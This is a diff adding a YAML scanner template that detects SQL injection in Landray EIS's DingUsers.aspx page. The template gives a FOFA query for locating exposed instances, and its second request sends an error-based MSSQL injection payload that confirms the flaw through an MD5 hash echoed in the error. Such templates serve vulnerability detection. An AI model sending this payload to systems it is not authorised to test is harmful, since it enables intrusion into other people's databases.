@@ -1,0 +1,21 @@
+id: poc-yaml-landray-eis-dingusers-aspx-sqli
+info:
+  name: 蓝凌EIS 智慧协同平台 DingUsers.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 蓝凌EIS
+  fofa: app="Landray-EIS智慧协同平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /SM/DingUsers.aspx?id=1
+  expression: status_code == 200 && contains(body,"扩展属性")
+- method: GET
+  path: /SM/DingUsers.aspx?id=1%20and%201=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--
+  expression: status_code == 500 && contains(body,"0x" + t2) && matches(body,"转换成数据类型(.*?)时失败")
+    && matches(body,"在将(.*?)值")
+transport: http
